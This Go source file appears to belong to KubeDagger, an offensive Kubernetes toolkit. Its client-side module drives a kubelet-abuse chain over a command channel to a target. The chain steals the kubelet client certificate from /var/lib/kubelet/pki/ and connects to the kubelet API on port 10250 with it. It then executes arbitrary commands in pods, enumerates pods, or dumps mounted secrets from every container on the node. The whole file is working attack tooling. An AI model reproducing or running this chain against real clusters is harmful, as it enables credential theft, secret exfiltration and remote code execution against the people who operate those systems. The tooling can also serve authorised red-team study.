package kubelet_abuse

import (
	"encoding/json"
	"fmt"
	"os"

	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/shared"
)

type AbuseResult struct {
	Actions []shared.ActionInfo `json:"actions"`
	Success bool                `json:"success"`
}

func Execute(target, action, nodeIP, podName, command, output string) error {
	result := &AbuseResult{}

	var actions []struct {
		name   string
		detail string
		cmd    string
	}

	switch action {
	case "exec":
		actions = []struct {
			name   string
			detail string
			cmd    string
		}{
			{"steal_node_creds", "extract kubelet client certificate from /var/lib/kubelet/pki/", "kubelet_steal_creds"},
			{"connect_kubelet", "connect to kubelet API on port 10250 with stolen credentials", "kubelet_connect"},
			{"exec_in_pod", "execute arbitrary command in target pod via /exec endpoint", "kubelet_exec"},
		}
	case "list":
		actions = []struct {
			name   string
			detail string
			cmd    string
		}{
			{"steal_node_creds", "extract kubelet client certificate from /var/lib/kubelet/pki/", "kubelet_steal_creds"},
			{"connect_kubelet", "connect to kubelet API on port 10250 with stolen credentials", "kubelet_connect"},
			{"list_pods", "enumerate all pods running on the node via /pods endpoint", "kubelet_list_pods"},
		}
	default: // secrets
		actions = []struct {
			name   string
			detail string
			cmd    string
		}{
			{"steal_node_creds", "extract kubelet client certificate from /var/lib/kubelet/pki/", "kubelet_steal_creds"},
			{"connect_kubelet", "connect to kubelet API on port 10250 with stolen credentials", "kubelet_connect"},
			{"dump_secrets", "read mounted secrets from all containers on the node", "kubelet_dump_secrets"},
		}
	}

	for _, a := range actions {
		cmd := a.cmd + "#" + nodeIP + "#" + podName + "#" + command
		status := shared.SendCommand(target, "/kubelet_abuse", cmd)
		result.Actions = append(result.Actions, shared.ActionInfo{
			Name:   a.name,
			Status: status,
			Detail: a.detail,
		})
	}

	result.Success = shared.AllSucceeded(result.Actions)

	data, _ := json.MarshalIndent(result, "", "  ")
	if output != "" {
		return os.WriteFile(output, data, 0644)
	}
	fmt.Println(string(data))
	return nil
}
